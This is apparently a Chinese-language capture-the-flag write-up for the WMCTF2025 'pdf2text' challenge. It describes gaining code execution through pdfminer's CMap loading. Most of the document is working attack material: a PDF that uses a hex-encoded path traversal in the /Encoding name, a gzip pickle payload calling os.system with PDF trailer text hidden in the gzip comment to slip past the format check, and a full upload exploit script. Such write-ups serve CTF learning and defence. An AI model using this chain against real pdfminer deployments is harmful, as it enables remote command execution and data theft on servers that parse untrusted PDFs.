# pdf2text

## 题目简述

题目提供一个 PDF 转文本服务：上传文件后先用 `PDFParser` / `PDFDocument` 判断内容是否像 PDF，再把文件写入 `uploads`，最后调用 `pdfminer.high_level.extract_pages()` 提取文本。附件源码禁止文件名里出现 `..` 或 `/`，并限制上传体最大 2 MB，但没有限制 PDF 内部的 CMap 名称。

关键漏洞点在 pdfminer 的 CMap 加载流程：Type0 字体的 `/Encoding` 会进入 `CMapDB._load_data`，该流程会从 CMap 路径中读取 gzip 压缩的 pickle 数据并反序列化。利用需要同时满足两件事：一是通过 PDF `/Encoding` 名称进行路径穿越，定位到上传目录里的恶意 CMap 文件；二是让恶意 gzip pickle 文件本身也能通过题目的 PDF 格式检测。

## 解题过程

### 触发 CMap 加载

pdfminer 这个库内部使用了 `pickle.loads`。关键位置在 `cmapdb.py` 的 `CMapDB._load_data`，逻辑是根据 CMap 名称拼出 `"%s.pickle.gz"`，在 CMap 搜索路径中打开 gzip 文件，最后把解压结果反序列化：

```python
filename = "%s.pickle.gz" % name
for directory in cmap_paths:
    path = os.path.join(directory, filename)
    if os.path.exists(path):
        gzfile = gzip.open(path)
        try:
            return type(str(name), (), pickle.loads(gzfile.read()))
        finally:
            gzfile.close()
```

![pdfminer 这个库内部使用了pickle.loads](<WMCTF2025-pdf2text-wp/pdfminer-这个库内部使用了pickle-loads.png>)

询问一下copilot该如何触发 CMapDB 的 _load_data 方法

![询问一下copilot该如何触发 CMapDB 的 _load_data 方法](<WMCTF2025-pdf2text-wp/询问一下copilot该如何触发-cmapdb-的-load-data-方法.png>)

给出的 poc.pdf 如下

```Plain
%PDF-1.4
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
>>
endobj
2 0 obj
<< /Type /Pages
   /Kids [3 0 R]
   /Count 1
>>
endobj
3 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 4 0 R
   /Resources <<
     /Font <<
       /F1 5 0 R
     >>
   >>
>>
endobj
4 0 obj
<< /Length 44 >>
stream
BT
/F1 24 Tf
1 0 0 1 100 700 Tm
<0015> Tj
ET
endstream
endobj
5 0 obj
<<
  /Type /Font
  /Subtype /Type0
  /BaseFont /AdobeSongStd-Light
  /Encoding /Adobe-GB1-0
  /DescendantFonts [6 0 R]
>>
endobj
6 0 obj
<<
  /Type /Font
  /Subtype /CIDFontType0
  /BaseFont /AdobeSongStd-Light
  /CIDSystemInfo <<
    /Registry (Adobe)
    /Ordering (GB1)
    /Supplement 0
  >>
>>
endobj
xref
0 7
0000000000 65535 f
0000000010 00000 n
0000000060 00000 n
0000000117 00000 n
0000000302 00000 n
0000000372 00000 n
0000000484 00000 n
trailer
<<
  /Root 1 0 R
  /Size 7
>>
startxref
582
%%EOF
```

使用代码验证：

poc.py

```Plain
from pdfminer.high_level import extract_text

text = extract_text('poc.pdf')
print(text)
```

打断点，确实调用了

![打断点，确实调用了](<WMCTF2025-pdf2text-wp/打断点-确实调用了.png>)

此时的调用栈

![此时的调用栈](<WMCTF2025-pdf2text-wp/此时的调用栈.png>)

现在已经能够进入 _load_data 方法了，接下来看看如何控制pickle文件的路径。

默认情况下，文件路径有 2 个：环境变量 `CMAP_PATH` 表示的路径，和 `/usr/share/pdfminer/`。

题目没有给 `CMAP_PATH` 环境变量，且 `/usr/share/pdfminer/` 不可写，所以这两个路径都不能用，需要进行路径穿越。

自然想到把上述poc.pdf中的 /Encoding 改成下面这样

```Plain
/Encoding /../../../../../../../../../../../../../../../../../../evil
```

但是点号和斜杠不会被当做字符串，需要进行16进制或者8进制编码一下：

```Plain
/Encoding /#2e#2e#2f#2e#2e#2f#2e#2e#2f#2e#2e#2f#2e#2e#2f#2e#2e#2fapp#2fa
```

得到的poc.pdf

![得到的poc.pdf](<WMCTF2025-pdf2text-wp/得到的poc-pdf.png>)

再次进行验证，可以成功穿越：

![再次进行验证，可以成功穿越](<WMCTF2025-pdf2text-wp/再次进行验证-可以成功穿越.png>)

现在回到题目，梳理一下思路：

1. 上传一个 gzip 压缩过的 pickle 序列化文件
2. 上传一个使用 CMapDB 加载序列化文件的pdf

附件 `app.py` 的过滤边界是：只检查上传文件名不含 `..` 或 `/`，保存路径固定在 `uploads` 下；内容检测只做一次 `PDFParser(io.BytesIO(pdf_content))` 和 `PDFDocument(parser)`。因此恶意 CMap 文件的文件名不能路径穿越，但 PDF 内部的 `/Encoding` 名称仍可路径穿越到 `uploads/evilpickle`。同时，第一次上传的 gzip pickle 也必须能通过这个宽松 PDF 检测：

```Python
try:
    # judge if is a pdf
    parser = PDFParser(io.BytesIO(pdf_content))
    doc = PDFDocument(parser)
except Exception as e:
    return str(e), 500
```

这就是难处所在了，pickle序列化文件的格式有严格要求，如何伪装成一个pdf呢？

接下来对原先的 poc.pdf 进行删减，黑盒测试一下什么样的pdf会通过检测

poc.pdf

```Plain
trailer
<<
  /Root 1 0 R
>>
startxref
```

测试脚本，如果不抛出异常说明是合法pdf

```Plain
from pdfminer.pdfparser import PDFParser
from pdfminer.pdfdocument import PDFDocument

parser = PDFParser(open('poc.pdf', 'rb'))
doc = PDFDocument(parser)
```

运行时发现没有报异常，说明上面的是一个合法pdf

接下来考虑如何把上面的数据塞进一个gzip压缩之后的pickle序列化文件

查资料后发现，gzip压缩实际上也是支持注释的，那把上面的pdf内容当做注释塞进去，是不是就可以被认为是pdf了？

下面的代码使用 pigz 压缩工具，生成一个带注释的gzip压缩过的pickle序列化文件

```Python
import subprocess, base64
data = b'''(S"whoami"
ios
system
.'''
data = base64.b64encode(data).decode()

target_file = 'evil.pickle.gz'
process = subprocess.Popen(
    ['/bin/bash', "-c", 'echo "{}" | base64 -d | pigz --comment "\ntrailer\n<< /Root 1 0 R /Size 1 >>\nstartxref\n" > {}'.format(data, target_file)]
)
process.wait()
```

检测是否是一个pdf，运行后不抛异常，说明检测通过了。

```Python
from pdfminer.pdfparser import PDFParser
from pdfminer.pdfdocument import PDFDocument

parser = PDFParser(open('evil.pickle.gz', 'rb'))
doc = PDFDocument(parser)
```

以上所有难点都解决了，完整exp如下：

```Python
import subprocess,requests, base64
from io import BytesIO

url = 'http://<target>'

data = b'''(S"mkdir /app/static && cat /flag > /app/static/1.txt"
ios
system
.'''
data = base64.b64encode(data).decode()

target_file = 'evilpickle.pickle.gz'
process = subprocess.Popen(
    ['/bin/bash', "-c", 'echo "{}" | base64 -d | pigz --comment "\ntrailer\n<< /Root 1 0 R /Size 1 >>\nstartxref\n" > {}'.format(data, target_file)]
)

process.wait()

res = requests.post(f'{url}/upload', files={
    'file':(target_file, open(target_file,'rb'))
})

print(res.text)

pdf = 'evil.pdf'
res = requests.post(f'{url}/upload', files={
    'file':(pdf, open(pdf, 'rb'))
})

print(res.text)
```

evil.pdf

```Shell
%PDF-1.4
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
>>
endobj
2 0 obj
<< /Type /Pages
   /Kids [3 0 R]
   /Count 1
>>
endobj
3 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 4 0 R
   /Resources <<
     /Font <<
       /F1 5 0 R
     >>
   >>
>>
endobj
4 0 obj
<< /Length 44 >>
stream
BT
/F1 24 Tf
1 0 0 1 100 700 Tm
<0015> Tj
ET
endstream
endobj
5 0 obj
<<
  /Type /Font
  /Subtype /Type0
  /BaseFont /AdobeSongStd-Light
  /Encoding /#2e#2e#2f#2e#2e#2f#2e#2e#2f#2e#2e#2f#2e#2e#2f#2e#2e#2f#2e#2e#2f#2e#2e#2f#2e#2e#2f#2e#2e#2f#2e#2e#2fapp#2fuploads#2fevilpickle
  /DescendantFonts [6 0 R]
>>
endobj
6 0 obj
<<
  /Type /Font
  /Subtype /CIDFontType0
  /BaseFont /AdobeSongStd-Light
  /CIDSystemInfo <<
    /Registry (Adobe)
    /Ordering (GB1)
    /Supplement 0
  >>
>>
endobj
xref
0 7
0000000000 65535 f
0000000010 00000 n
0000000060 00000 n
0000000117 00000 n
0000000302 00000 n
0000000372 00000 n
0000000484 00000 n
trailer
<<
  /Root 1 0 R
  /Size 7
>>
startxref
582
%%EOF
```

## 方法总结

- 核心技巧：利用 pdfminer CMap 加载流程中的 gzip pickle 反序列化，借 PDF `/Encoding` 名称穿越到上传目录，再让 gzip pickle 通过 PDF 检测。
- 识别信号：看到 PDF 解析服务调用 pdfminer，并允许上传任意文件名或可控 Type0 字体 `/Encoding` 时，应检查 `CMapDB`、`CMAP_PATH`、gzip CMap 文件和 pickle 加载路径。
- 复用要点：文件名过滤只限制上传名不够，PDF 内部对象仍可能形成路径；gzip header 的 comment 字段可携带额外文本，使同一文件既是可解压的 gzip pickle，又能被宽松 PDF 检测识别为 PDF。最终利用顺序必须先上传恶意 CMap gzip，再上传引用它的 PDF。
